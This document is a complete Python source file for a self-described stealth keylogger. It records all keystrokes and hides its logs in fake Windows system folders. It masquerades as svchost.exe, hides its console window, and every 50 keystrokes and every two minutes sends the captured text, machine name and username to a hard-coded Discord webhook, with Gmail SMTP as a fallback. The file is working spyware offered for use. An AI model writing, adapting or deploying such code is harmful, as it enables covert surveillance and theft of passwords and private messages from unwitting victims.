#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Stealth Keylogger - Professional Implementation
Advanced keystroke logging with stealth and exfiltration capabilities
"""

import os
import sys
import time
import json
import threading
import requests
import smtplib
from datetime import datetime
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from pynput import keyboard
from pynput.keyboard import Key, KeyCode

class StealthKeylogger:
    """Professional stealth keylogger implementation"""
    
    def __init__(self):
        self.keystrokes = []
        self.running = False
        self.listener = None
        
        # Stealth settings
        self.hidden_dir = self._get_hidden_dir()
        self.log_file = os.path.join(self.hidden_dir, "system32.log")
        self.backup_file = os.path.join(self.hidden_dir, "windows_update.log")
        
        # Exfiltration settings
        self.webhook_url = "https://discord.com/api/webhooks/1411086016328110222/i8MHVzdGueDfguKBm52Hq7RIlYdiXfncX-7GYd6zhXpldyQh2Uc8Sa3sQepKlkVhZY2o"
        self.email_config = {
            'smtp_server': 'smtp.gmail.com',
            'smtp_port': 587,
            'sender_email': 'YOUR_EMAIL@gmail.com',
            'sender_password': 'YOUR_APP_PASSWORD',
            'receiver_email': 'YOUR_EMAIL@gmail.com'
        }
        
        # Initialize storage and stealth
        self._create_hidden_storage()
        self._hide_process()
    
    def _get_hidden_dir(self):
        """Get hidden storage directory"""
        paths = [
            os.path.expanduser("~\\AppData\\Local\\Microsoft\\Windows\\Update"),
            os.path.expanduser("~\\AppData\\Local\\Microsoft\\Windows\\System32"),
            os.path.expanduser("~\\AppData\\Local\\Microsoft\\Windows\\WinSxS"),
            "C:\\Windows\\System32\\config\\systemprofile\\AppData\\Local\\Microsoft\\Windows\\Update"
        ]
        
        for path in paths:
            if os.path.exists(os.path.dirname(path)):
                return path
        
        return paths[0]
    
    def _create_hidden_storage(self):
        """Create hidden storage directory"""
        try:
            if not os.path.exists(self.hidden_dir):
                os.makedirs(self.hidden_dir, exist_ok=True)
                
            if os.name == 'nt':
                os.system(f'attrib +h +s "{self.hidden_dir}"')
                
        except Exception:
            pass
    
    def _hide_process(self):
        """Hide process from detection"""
        try:
            if hasattr(sys, 'argv'):
                sys.argv[0] = "svchost.exe"
            
            if os.name == 'nt':
                import ctypes
                ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
                
        except Exception:
            pass
    
    def _send_to_discord(self, data):
        """Send data to Discord webhook"""
        try:
            if self.webhook_url == "YOUR_DISCORD_WEBHOOK_URL_HERE":
                return False
                
            # Get all keystrokes for full data transmission
            all_keystrokes = data['keystrokes']
            
            # Convert keystrokes to readable text
            keystroke_text = ""
            for ks in all_keystrokes:
                if ks['type'] == 'press':
                    if ks['key'] == ' ':
                        keystroke_text += " "
                    elif ks['key'] == '\n':
                        keystroke_text += "\n"
                    elif ks['key'] == '\t':
                        keystroke_text += "\t"
                    elif ks['key'] == '[BACKSPACE]':
                        keystroke_text += "[BACKSPACE]"
                    elif ks['key'] == '[DELETE]':
                        keystroke_text += "[DELETE]"
                    elif ks['key'] == '[ESC]':
                        keystroke_text += "[ESC]"
                    elif hasattr(ks['key'], 'char') and ks['key'].char:
                        keystroke_text += ks['key'].char
                    else:
                        keystroke_text += str(ks['key'])
            
            # Create detailed payload with full keystroke data
            payload = {
                "content": f"**FULL KEYSTROKE DATA** - {len(all_keystrokes)} keystrokes captured",
                "embeds": [{
                    "title": "Complete Keystroke Log",
                    "description": f"**Machine:** {data['machine_id']}\n**User:** {data['user']}\n**Total Keystrokes:** {len(all_keystrokes)}\n**Timestamp:** {data['timestamp']}\n\n**FULL TEXT:**\n```\n{keystroke_text}\n```",
                    "color": 15158332,
                    "timestamp": data['timestamp']
                }]
            }
            
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Content-Type': 'application/json'
            }
            
            response = requests.post(self.webhook_url, json=payload, headers=headers, timeout=10)
            return response.status_code in [200, 204]
            
        except Exception:
            return False
    
    def _send_to_email(self, data):
        """Send data via email"""
        try:
            if self.email_config['sender_email'] == 'YOUR_EMAIL@gmail.com':
                return False
                
            msg = MIMEMultipart()
            msg['From'] = self.email_config['sender_email']
            msg['To'] = self.email_config['receiver_email']
            msg['Subject'] = 'Windows System Update Report'
            
            body = f"""
            System Update Report
            Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
            
            Data:
            {json.dumps(data, indent=2)}
            """
            
            msg.attach(MIMEText(body, 'plain'))
            
            server = smtplib.SMTP(self.email_config['smtp_server'], self.email_config['smtp_port'])
            server.starttls()
            server.login(self.email_config['sender_email'], self.email_config['sender_password'])
            server.send_message(msg)
            server.quit()
            
            return True
            
        except Exception:
            return False
    
    def _exfiltrate_data(self):
        """Send data to remote location"""
        try:
            exfil_data = {
                'timestamp': datetime.now().isoformat(),
                'machine_id': os.getenv('COMPUTERNAME', 'Unknown'),
                'user': os.getenv('USERNAME', 'Unknown'),
                'keystrokes': self.keystrokes[-100:]
            }
            
            discord_result = self._send_to_discord(exfil_data)
            
            if discord_result:
                return "Discord"
            
            email_result = self._send_to_email(exfil_data)
            
            if email_result:
                return "Email"
            
            return "Failed"
            
        except Exception:
            return "Failed"
    
    def _on_key_press(self, key):
        """Handle key press events"""
        if not self.running:
            return False
        
        try:
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            
            if hasattr(key, 'char') and key.char:
                key_str = key.char
            elif key == Key.space:
                key_str = " "
            elif key == Key.enter:
                key_str = "\n"
            elif key == Key.tab:
                key_str = "\t"
            elif key == Key.backspace:
                key_str = "[BACKSPACE]"
            elif key == Key.delete:
                key_str = "[DELETE]"
            elif key == Key.esc:
                key_str = "[ESC]"
            else:
                key_str = str(key)
            
            keystroke_data = {
                'timestamp': timestamp,
                'key': key_str,
                'type': 'press'
            }
            
            self.keystrokes.append(keystroke_data)
            
            if len(self.keystrokes) % 10 == 0:
                self._save_to_file()
            
            if len(self.keystrokes) % 50 == 0:
                exfil_result = self._exfiltrate_data()
                if exfil_result != "Failed":
                    print(f"Data transmitted via {exfil_result}")
            
            if key == Key.esc:
                return False
                
        except Exception:
            pass
        
        return True
    
    def _on_key_release(self, key):
        """Handle key release events"""
        if not self.running:
            return False
        
        try:
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            
            keystroke_data = {
                'timestamp': timestamp,
                'key': str(key),
                'type': 'release'
            }
            
            self.keystrokes.append(keystroke_data)
            
        except Exception:
            pass
        
        return True
    
    def _save_to_file(self):
        """Save keystrokes to hidden file"""
        try:
            with open(self.log_file, 'w', encoding='utf-8') as f:
                json.dump(self.keystrokes, f, indent=2, ensure_ascii=False)
            
            with open(self.backup_file, 'w', encoding='utf-8') as f:
                json.dump(self.keystrokes, f, indent=2, ensure_ascii=False)
                
        except Exception:
            pass
    
    def start(self):
        """Start keystroke logging"""
        if self.running:
            return
        
        self.running = True
        
        self.listener = keyboard.Listener(
            on_press=self._on_key_press,
            on_release=self._on_key_release
        )
        
        self.listener.start()
        self._start_auto_save()
        self._start_auto_exfiltration()
    
    def _start_auto_save(self):
        """Start automatic saving thread"""
        def auto_save():
            while self.running:
                time.sleep(30)
                if self.keystrokes:
                    self._save_to_file()
        
        save_thread = threading.Thread(target=auto_save, daemon=True)
        save_thread.start()
    
    def _start_auto_exfiltration(self):
        """Start automatic exfiltration thread"""
        def auto_exfil():
            while self.running:
                time.sleep(120)
                if self.keystrokes:
                    exfil_result = self._exfiltrate_data()
                    if exfil_result != "Failed":
                        print(f"Auto-transmission via {exfil_result}")
        
        exfil_thread = threading.Thread(target=auto_exfil, daemon=True)
        exfil_thread.start()
    
    def stop(self):
        """Stop keystroke logging"""
        self.running = False
        
        if self.listener:
            self.listener.stop()
            self.listener = None
        
        if self.keystrokes:
            self._save_to_file()
            self._exfiltrate_data()
    
    def get_stats(self):
        """Get logging statistics"""
        return {
            'total_keystrokes': len(self.keystrokes),
            'storage_location': self.hidden_dir,
            'log_file': self.log_file,
            'backup_file': self.backup_file,
            'is_running': self.running
        }

def main():
    """Main execution function"""
    print("Stealth Keylogger Initializing...")
    
    keylogger = StealthKeylogger()
    
    try:
        keylogger.start()
        print("Keylogger started successfully")
        print("Keystroke logging active - Press ESC to stop")
        print(f"Storage location: {keylogger.hidden_dir}")
        print("Data transmission: Every 50 keystrokes + 2 minutes")
        
        while keylogger.running:
            time.sleep(1)
            
            if int(time.time()) % 30 == 0:
                stats = keylogger.get_stats()
                print(f"Captured {stats['total_keystrokes']} keystrokes")
        
    except KeyboardInterrupt:
        print("Stopping keylogger...")
    except Exception as e:
        print(f"Error: {e}")
    finally:
        keylogger.stop()
        print("Keylogger stopped")
        
        stats = keylogger.get_stats()
        print(f"Final Statistics:")
        print(f"  Total keystrokes: {stats['total_keystrokes']}")
        print(f"  Storage location: {stats['storage_location']}")
        print(f"  Log file: {stats['log_file']}")

if __name__ == "__main__":
    main()
